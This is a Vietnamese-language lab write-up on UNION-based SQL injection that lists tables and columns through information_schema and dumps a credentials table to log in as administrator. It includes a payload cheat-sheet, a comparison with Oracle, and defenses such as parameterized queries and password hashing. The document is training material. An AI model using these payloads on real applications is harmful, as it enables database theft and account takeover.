# Lab 9 — SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases

## Mục tiêu
Khai thác lỗ hổng SQLi trong bộ lọc `category` bằng UNION attack để **tự khám phá** (không được đề bài cho biết trước) tên bảng, tên cột chứa username/password, rồi lấy được thông tin đăng nhập của `administrator` và login thành công.

---

## 1. Bản chất lỗ hổng

**Root cause:** Giống mọi lab khác — `category` bị nối chuỗi trực tiếp vào SQL.

**Kỹ thuật:** UNION attack, kết hợp truy vấn vào **bảng hệ thống chuẩn ANSI SQL** `information_schema` — đây là điểm khác biệt cốt lõi so với Lab 10 (Oracle dùng `all_tables`/`all_tab_columns`, không có `information_schema`).

**Điểm mấu chốt của lab này so với Lab 7/8 (chỉ đọc 1 giá trị version có sẵn):** Ở đây phải tự **dò tuần tự 3 tầng thông tin chưa biết trước** — tên bảng → tên cột → dữ liệu thật — mỗi tầng đều phụ thuộc kết quả tầng trước, không thể nhảy thẳng vào bước cuối.

---

## 2. Quy trình khai thác (5 giai đoạn, đúng theo solution)

### Giai đoạn 1 — Xác định số cột và kiểu dữ liệu

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- lỗi tại đây → 2 cột thật
```

**Payload xác nhận cả 2 cột là text:**
```sql
' UNION SELECT 'abc','def'--
```
→ Không lỗi → xác nhận: DBMS không phải Oracle (vì không cần `FROM dual`), và cả 2 cột chấp nhận kiểu text.

### Giai đoạn 2 — Liệt kê danh sách bảng trong database

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**Giải thích:** `information_schema.tables` là bảng hệ thống **chuẩn ANSI SQL**, có mặt trên hầu hết DBMS non-Oracle (MySQL, PostgreSQL, MSSQL) — chứa metadata về toàn bộ bảng trong database. Cột `table_name` chứa tên từng bảng. Cột thứ 2 để `NULL` để giữ đúng 2 cột đã xác định.

**Cách lọc kết quả khi danh sách bảng quá dài (mẹo thực chiến bạn đã áp dụng):** Vì response trả về **toàn bộ** tên bảng trong DB (có thể hàng chục/hàng trăm bảng hệ thống không liên quan), cần tìm theo pattern gợi ý từ đề bài — ở đây đề bài nói rõ có bảng lưu username/password, nên tìm theo tiền tố `users_` trong kết quả trả về → tìm ra:
```
users_ssypfc
```
→ Tên bảng có hậu tố ngẫu nhiên (`ssypfc`) — kỹ thuật thường gặp trong lab PortSwigger để tránh việc học thuộc tên bảng cố định, buộc phải thực sự dò ra bằng injection.

### Giai đoạn 3 — Liệt kê tên cột của bảng `users_ssypfc`

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ssypfc'--
```

**Giải thích:** `information_schema.columns` chứa metadata về cột của **mọi** bảng trong DB — thêm điều kiện `WHERE table_name='...'` để chỉ lọc đúng cột của bảng vừa tìm được ở Giai đoạn 2, tránh liệt kê lẫn cột của các bảng khác.

**Kết quả tìm theo pattern gợi ý:**
- Tìm theo `password_` → `password_dmgnxd`
- Tìm theo `username_` → `username_hcyhfy`

### Giai đoạn 4 — Truy xuất toàn bộ username và password

```sql
' UNION SELECT username_hcyhfy, password_dmgnxd FROM users_ssypfc--
```

**Giải thích:** Đã biết đúng tên bảng và tên 2 cột cần thiết, SELECT trực tiếp 2 cột đó thay vì tiếp tục dò qua `information_schema` — kết quả trả về toàn bộ danh sách username/password trong bảng.

### Giai đoạn 5 — Tìm dòng của `administrator` và đăng nhập

Trong kết quả trả về (hiển thị lẫn trong danh sách sản phẩm trên response), tìm dòng có username là `administrator`:
```
administrator : 6z0hg4lhrx8msdwoehqb
```

Đăng nhập với:
- **Username:** `administrator`
- **Password:** `6z0hg4lhrx8msdwoehqb`

→ Lab chuyển "Not solved" → **"Solved"**.

---

## 3. So sánh trực tiếp với Lab 10 (đã làm trước đó, trên Oracle)

| Việc cần làm | Lab 9 (non-Oracle) | Lab 10 (Oracle) |
|---|---|---|
| Bảng hệ thống chứa danh sách bảng | `information_schema.tables` | `all_tables` |
| Bảng hệ thống chứa danh sách cột | `information_schema.columns` | `all_tab_columns` |
| Điều kiện lọc theo bảng | `WHERE table_name = '...'` (giống nhau ở cả 2) | `WHERE table_name = '...'` |
| Cần `FROM dual` khi SELECT hằng số? | Không | Có, bắt buộc |
| Comment | `--` (hoặc `#` nếu MySQL) | `--` |

→ Đây chính là minh chứng thực chiến cho nguyên tắc: **cùng 1 kỹ thuật UNION-based schema enumeration, nhưng tên bảng hệ thống hoàn toàn khác nhau tùy DBMS** — không thể áp dụng nguyên payload Oracle sang non-Oracle hay ngược lại.

---

## 4. Bug/lỗi thường gặp

| Lỗi gặp phải | Nguyên nhân | Cách sửa |
|---|---|---|
| Dùng nhầm `all_tables` (cú pháp Oracle) trên DB này | Nhầm lẫn giữa 2 lab liền kề (9 và 10) có cùng mục tiêu nhưng khác DBMS | Xác nhận DBMS trước (Giai đoạn 1 — nếu không cần `FROM dual` mà vẫn chạy được → không phải Oracle) rồi mới chọn đúng bảng hệ thống |
| Danh sách bảng trả về quá dài, khó tìm bảng đúng | `information_schema.tables` liệt kê cả bảng hệ thống nội bộ, không riêng bảng ứng dụng | Lọc kết quả theo từ khóa gợi ý trong đề bài (VD `users_`), hoặc thêm điều kiện `WHERE table_schema NOT IN ('information_schema', 'mysql', 'pg_catalog')` nếu muốn lọc ngay trong payload |
| Số cột trong `UNION SELECT` sai khi lấy từ `information_schema` | Dùng `SELECT *` thay vì chỉ định đúng 2 cột cần lấy | Luôn SELECT đúng số cột đã xác định ở Giai đoạn 1, cột thừa điền `NULL` |
| Nhầm cột `username`/`password` do tên cột có hậu tố ngẫu nhiên giống nhau format | Copy nhầm hậu tố giữa 2 cột khi tên na ná nhau | Đối chiếu lại chính xác chuỗi hậu tố trước khi viết payload cuối |

---

## 5. Vì sao đây vẫn là in-band UNION-based, không phải blind

Toàn bộ 5 giai đoạn đều đọc dữ liệu **trực tiếp qua response** (hiển thị lẫn trong phần liệt kê sản phẩm) — không cần side-channel gián tiếp. Đây là ví dụ điển hình cho việc UNION attack **mở rộng phạm vi đọc dữ liệu ra ngoài bảng gốc hoàn toàn** (từ `products` sang bảng chứa credential), miễn số cột và kiểu dữ liệu tương thích.

---

## 6. Cách phòng chống

**Gốc rễ — Parameterized query:** loại bỏ khả năng `category` bị hiểu thành cú pháp `UNION SELECT` mới.

**Bổ sung (defense in depth):**
- **Không bao giờ lưu password dạng plaintext** — hash bằng bcrypt/argon2, để dù bị SQLi leak được cột `password`, kẻ tấn công vẫn phải crack hash thay vì có ngay password thật.
- Least privilege cho DB account: hạn chế quyền `SELECT` trên `information_schema` nếu ứng dụng không thực sự cần — nhiều DBMS cho phép revoke quyền đọc metadata ở mức schema.
- Đặt tên bảng/cột theo pattern dễ đoán (không có hậu tố ngẫu nhiên như lab) thực ra **không giúp gì về bảo mật** — chỉ làm chậm attacker vài bước dò, không phải biện pháp phòng chống thật sự (security through obscurity).

---

## 7. Câu hỏi tự kiểm tra

1. Vì sao phải dò tuần tự bảng → cột → dữ liệu, thay vì có thể nhảy thẳng vào bước đọc dữ liệu ngay từ đầu?
2. Vì sao `information_schema` được coi là "chuẩn ANSI SQL" nhưng Oracle lại không dùng nó — điều này nói lên gì về mức độ tuân thủ chuẩn SQL giữa các DBMS?
3. Nếu bảng chứa credential không có tên gợi ý rõ ràng như `users_xxx` mà đặt tên hoàn toàn ngẫu nhiên không liên quan (VD `tbl_a7f3`), chiến lược dò tìm của bạn cần thay đổi như thế nào?
4. Vì sao việc hash password ở tầng ứng dụng không "vá" được lỗ hổng SQLi, nhưng vẫn là biện pháp phòng chống quan trọng cần có song song với parameterized query?

---

## 8. Payload cuối cùng (cheat-sheet)

```sql
-- Bước 1: dò số cột
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- lỗi tại đây → 2 cột

-- Bước 2: xác nhận 2 cột text + không phải Oracle
' UNION SELECT 'abc','def'--

-- Bước 3: liệt kê bảng
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Bước 4: liệt kê cột của bảng credential
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ssypfc'--

-- Bước 5: lấy toàn bộ username/password
' UNION SELECT username_hcyhfy, password_dmgnxd FROM users_ssypfc--
```

**Kết quả:** `administrator` : `6z0hg4lhrx8msdwoehqb` → đăng nhập thành công → lab solved.
